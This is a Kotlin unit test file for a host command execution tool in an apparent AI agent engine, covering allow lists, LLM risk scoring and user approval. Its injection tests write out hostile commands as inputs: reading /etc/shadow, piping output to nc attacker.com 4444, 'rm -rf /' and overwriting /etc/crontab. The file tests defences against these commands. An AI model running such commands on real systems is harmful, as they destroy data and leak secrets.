package io.github.klaw.engine.tools

import io.github.klaw.common.config.HostExecutionConfig
import io.github.klaw.common.config.PreValidationConfig
import io.github.klaw.common.llm.LlmRequest
import io.github.klaw.common.llm.LlmResponse
import io.github.klaw.common.protocol.ApprovalResponseMessage
import io.github.klaw.common.protocol.SocketMessage
import io.github.klaw.engine.llm.LlmRouter
import io.mockk.coEvery
import io.mockk.mockk
import kotlinx.coroutines.async
import kotlinx.coroutines.delay
import kotlinx.coroutines.test.runTest
import org.junit.jupiter.api.Assertions.assertFalse
import org.junit.jupiter.api.Assertions.assertTrue
import org.junit.jupiter.api.Test

class HostExecToolTest {
    private val sentMessages = mutableListOf<SocketMessage>()
    private val sender: suspend (SocketMessage) -> Unit = { sentMessages.add(it) }

    private fun config(
        enabled: Boolean = true,
        allowList: List<String> = emptyList(),
        notifyList: List<String> = emptyList(),
        preValidation: PreValidationConfig = PreValidationConfig(enabled = false),
        askTimeoutMin: Int = 5,
    ) = HostExecutionConfig(
        enabled = enabled,
        allowList = allowList,
        notifyList = notifyList,
        preValidation = preValidation,
        askTimeoutMin = askTimeoutMin,
    )

    private fun fakeLlmRouter(riskScore: Int = 3): LlmRouter {
        val router = mockk<LlmRouter>()
        coEvery { router.chat(any<LlmRequest>(), any()) } returns
            LlmResponse(
                content = "$riskScore",
                toolCalls = null,
                usage = null,
                finishReason = io.github.klaw.common.llm.FinishReason.STOP,
            )
        return router
    }

    private fun nonNumericThenNumericLlmRouter(): LlmRouter {
        val router = mockk<LlmRouter>()
        coEvery { router.chat(any<LlmRequest>(), any()) } returnsMany
            listOf(
                LlmResponse(
                    content = "I think the risk is moderate",
                    toolCalls = null,
                    usage = null,
                    finishReason = io.github.klaw.common.llm.FinishReason.STOP,
                ),
                LlmResponse(
                    content = "3",
                    toolCalls = null,
                    usage = null,
                    finishReason = io.github.klaw.common.llm.FinishReason.STOP,
                ),
            )
        return router
    }

    private fun failingLlmRouter(): LlmRouter {
        val router = mockk<LlmRouter>()
        coEvery { router.chat(any<LlmRequest>(), any()) } throws RuntimeException("LLM unavailable")
        return router
    }

    private fun tool(
        hostConfig: HostExecutionConfig,
        llmRouter: LlmRouter = fakeLlmRouter(),
    ): HostExecTool {
        val approvalService = ApprovalService(sender)
        return HostExecTool(hostConfig, llmRouter, approvalService)
    }

    @Test
    fun `command in allowList executes immediately`() =
        runTest {
            val t = tool(config(allowList = listOf("df -h", "free -m")))
            val result = t.execute("df -h", "chat_1")
            // Should execute without asking — result should not contain rejection
            assertFalse(result.contains("rejected"), "Should not be rejected: $result")
            assertFalse(result.contains("disabled"), "Should not be disabled: $result")
        }

    @Test
    fun `command in notifyList executes and sends notification`() =
        runTest {
            val t = tool(config(notifyList = listOf("systemctl restart *")))
            val result = t.execute("systemctl restart klaw-engine", "chat_1")
            assertFalse(result.contains("rejected"), "Should not be rejected")
            assertTrue(sentMessages.size >= 1, "Should send notification")
        }

    @Test
    fun `allowList uses glob matching`() =
        runTest {
            val t = tool(config(allowList = listOf("systemctl status *")))
            val result = t.execute("systemctl status klaw-engine", "chat_1")
            assertFalse(result.contains("rejected"), "Glob should match")
        }

    @Test
    fun `notifyList uses glob matching`() =
        runTest {
            val t = tool(config(notifyList = listOf("docker restart *")))
            val result = t.execute("docker restart my-container", "chat_1")
            assertFalse(result.contains("rejected"))
            assertTrue(sentMessages.isNotEmpty(), "Should send notification")
        }

    @Test
    fun `LLM risk below threshold executes without asking`() =
        runTest {
            val t =
                tool(
                    config(
                        preValidation = PreValidationConfig(enabled = true, model = "test/haiku", riskThreshold = 5),
                    ),
                    llmRouter = fakeLlmRouter(riskScore = 2),
                )
            val result = t.execute("cat /var/log/syslog", "chat_1")
            assertFalse(result.contains("rejected"))
            assertTrue(sentMessages.isEmpty(), "Should not ask user for low risk")
        }

    @Test
    fun `LLM risk at or above threshold triggers approval request`() =
        runTest {
            val approval = ApprovalService(sender)
            val t =
                HostExecTool(
                    config(
                        preValidation = PreValidationConfig(enabled = true, model = "test/haiku", riskThreshold = 5),
                    ),
                    fakeLlmRouter(riskScore = 8),
                    approval,
                )

            val result = async { t.execute("apt upgrade -y", "chat_1") }
            delay(50)

            // Should have sent approval request
            assertTrue(sentMessages.isNotEmpty(), "Should send approval request")

            // Approve it
            val reqMsg = sentMessages.filterIsInstance<io.github.klaw.common.protocol.ApprovalRequestMessage>().first()
            approval.handleResponse(ApprovalResponseMessage(reqMsg.id, approved = true))

            val output = result.await()
            assertFalse(output.contains("rejected"), "Should execute after approval")
        }

    @Test
    fun `LLM unavailable falls back to ask`() =
        runTest {
            val approval = ApprovalService(sender)
            val t =
                HostExecTool(
                    config(
                        preValidation = PreValidationConfig(enabled = true, model = "test/haiku", riskThreshold = 5),
                        askTimeoutMin = 1,
                    ),
                    failingLlmRouter(),
                    approval,
                )

            val result = t.execute("some-command", "chat_1")
            // With askTimeoutMin=1, timeout should happen after 1 minute (virtual time) → rejected
            assertTrue(
                result.contains("timed out") || result.contains("rejected"),
                "Should fall back to ask and timeout: $result",
            )
        }

    @Test
    fun `user approves command — executes`() =
        runTest {
            val approval = ApprovalService(sender)
            val t =
                HostExecTool(
                    config(preValidation = PreValidationConfig(enabled = false)),
                    fakeLlmRouter(),
                    approval,
                )

            val result = async { t.execute("some-command", "chat_1") }
            delay(50)

            val reqMsg = sentMessages.filterIsInstance<io.github.klaw.common.protocol.ApprovalRequestMessage>().first()
            approval.handleResponse(ApprovalResponseMessage(reqMsg.id, approved = true))

            assertFalse(result.await().contains("rejected"))
        }

    @Test
    fun `user denies command — returns rejection`() =
        runTest {
            val approval = ApprovalService(sender)
            val t =
                HostExecTool(
                    config(preValidation = PreValidationConfig(enabled = false)),
                    fakeLlmRouter(),
                    approval,
                )

            val result = async { t.execute("some-command", "chat_1") }
            delay(50)

            val reqMsg = sentMessages.filterIsInstance<io.github.klaw.common.protocol.ApprovalRequestMessage>().first()
            approval.handleResponse(ApprovalResponseMessage(reqMsg.id, approved = false))

            assertTrue(result.await().contains("rejected"), "Should contain rejection message")
        }

    @Test
    fun `approval timeout — returns timeout error`() =
        runTest {
            val t =
                tool(
                    config(preValidation = PreValidationConfig(enabled = false), askTimeoutMin = 1),
                )

            val result = t.execute("some-command", "chat_1")
            assertTrue(
                result.contains("timed out") || result.contains("rejected"),
                "Should timeout: $result",
            )
        }

    @Test
    fun `preValidation disabled — skips LLM goes to ask`() =
        runTest {
            val approval = ApprovalService(sender)
            val t =
                HostExecTool(
                    config(preValidation = PreValidationConfig(enabled = false)),
                    fakeLlmRouter(),
                    approval,
                )

            val result = async { t.execute("some-command", "chat_1") }
            delay(50)

            // Should have sent approval request directly (no LLM call)
            assertTrue(
                sentMessages.filterIsInstance<io.github.klaw.common.protocol.ApprovalRequestMessage>().isNotEmpty(),
                "Should ask user directly when preValidation disabled",
            )

            val reqMsg = sentMessages.filterIsInstance<io.github.klaw.common.protocol.ApprovalRequestMessage>().first()
            approval.handleResponse(ApprovalResponseMessage(reqMsg.id, approved = true))

            result.await()
        }

    @Test
    fun `LLM non-numeric response with extractable number uses it`() =
        runTest {
            val router = mockk<LlmRouter>()
            coEvery { router.chat(any<LlmRequest>(), any()) } returns
                LlmResponse(
                    content = "confidence level 2",
                    toolCalls = null,
                    usage = null,
                    finishReason = io.github.klaw.common.llm.FinishReason.STOP,
                )
            val t =
                HostExecTool(
                    config(
                        preValidation = PreValidationConfig(enabled = true, model = "test/haiku", riskThreshold = 5),
                    ),
                    router,
                    ApprovalService(sender),
                )
            val result = t.execute("cat /var/log/syslog", "chat_1")
            // Score extracted as 2, below threshold 5 → execute without asking
            assertFalse(result.contains("rejected"), "Extracted score should allow execution: $result")
            assertTrue(sentMessages.isEmpty(), "Should not ask user when extracted score is below threshold")
        }

    @Test
    fun `LLM non-parseable response retries and uses second response`() =
        runTest {
            val t =
                HostExecTool(
                    config(
                        preValidation = PreValidationConfig(enabled = true, model = "test/haiku", riskThreshold = 5),
                    ),
                    nonNumericThenNumericLlmRouter(),
                    ApprovalService(sender),
                )
            val result = t.execute("cat /var/log/syslog", "chat_1")
            // First response unparseable → retry → "3" → below threshold → execute
            assertFalse(result.contains("rejected"), "Retry should succeed: $result")
            assertTrue(sentMessages.isEmpty(), "Should not ask user after successful retry")
        }

    @Test
    fun `host_exec disabled — returns error`() =
        runTest {
            val t = tool(config(enabled = false))
            val result = t.execute("any-command", "chat_1")
            assertTrue(result.contains("disabled"), "Should report disabled: $result")
        }

    // --- Command injection rejection tests (issue #23) ---

    @Test
    fun `allowList rejects command with semicolon injection`() =
        runTest {
            val t = tool(config(allowList = listOf("ls *")))
            val result = t.execute("ls -la ; cat /etc/shadow", "chat_1")
            assertTrue(result.contains("shell operators"), "Should reject: $result")
        }

    @Test
    fun `allowList rejects command with pipe injection`() =
        runTest {
            val t = tool(config(allowList = listOf("ls *")))
            val result = t.execute("ls /tmp | nc attacker.com 4444", "chat_1")
            assertTrue(result.contains("shell operators"), "Should reject: $result")
        }

    @Test
    fun `allowList rejects command with AND chaining`() =
        runTest {
            val t = tool(config(allowList = listOf("echo *")))
            val result = t.execute("echo hello && rm -rf /", "chat_1")
            assertTrue(result.contains("shell operators"), "Should reject: $result")
        }

    @Test
    fun `allowList rejects command with backtick substitution`() =
        runTest {
            val t = tool(config(allowList = listOf("ls *")))
            val result = t.execute("ls `rm -rf /`", "chat_1")
            assertTrue(result.contains("shell operators"), "Should reject: $result")
        }

    @Test
    fun `allowList rejects command with dollar substitution`() =
        runTest {
            val t = tool(config(allowList = listOf("ls *")))
            val result = t.execute("ls \$(rm -rf /)", "chat_1")
            assertTrue(result.contains("shell operators"), "Should reject: $result")
        }

    @Test
    fun `allowList rejects command with redirect`() =
        runTest {
            val t = tool(config(allowList = listOf("echo *")))
            val result = t.execute("echo pwned > /etc/crontab", "chat_1")
            assertTrue(result.contains("shell operators"), "Should reject: $result")
        }

    @Test
    fun `notifyList rejects command with injection and does not notify`() =
        runTest {
            val t = tool(config(notifyList = listOf("docker restart *")))
            val result = t.execute("docker restart foo && rm -rf /", "chat_1")
            assertTrue(result.contains("shell operators"), "Should reject: $result")
            assertTrue(sentMessages.isEmpty(), "Should NOT send notification for rejected command")
        }

    @Test
    fun `LLM pre-validation rejects command with shell operators even if low risk`() =
        runTest {
            val t =
                tool(
                    config(
                        preValidation = PreValidationConfig(enabled = true, model = "test/haiku", riskThreshold = 5),
                    ),
                    llmRouter = fakeLlmRouter(riskScore = 1),
                )
            val result = t.execute("cat /var/log/syslog ; rm -rf /", "chat_1")
            assertTrue(result.contains("shell operators"), "Should reject: $result")
        }

    @Test
    fun `command with operators not in any list goes to approval not rejection`() =
        runTest {
            val approval = ApprovalService(sender)
            val t =
                HostExecTool(
                    config(preValidation = PreValidationConfig(enabled = false)),
                    fakeLlmRouter(),
                    approval,
                )

            val result = async { t.execute("ls ; rm -rf /", "chat_1") }
            delay(50)

            // Should send approval request, NOT reject with "shell operators"
            val approvalMsgs =
                sentMessages.filterIsInstance<io.github.klaw.common.protocol.ApprovalRequestMessage>()
            assertTrue(approvalMsgs.isNotEmpty(), "Should ask user for approval, not auto-reject")

            approval.handleResponse(ApprovalResponseMessage(approvalMsgs.first().id, approved = false))
            val output = result.await()
            assertTrue(output.contains("rejected"), "Should be rejected by user: $output")
            assertFalse(output.contains("shell operators"), "Should NOT be auto-rejected: $output")
        }

    @Test
    fun `safe command in allowList still executes`() =
        runTest {
            val t = tool(config(allowList = listOf("df -h", "free -m")))
            val result = t.execute("df -h", "chat_1")
            assertFalse(result.contains("shell operators"), "Safe command should execute: $result")
            assertFalse(result.contains("rejected"), "Safe command should not be rejected: $result")
        }
}
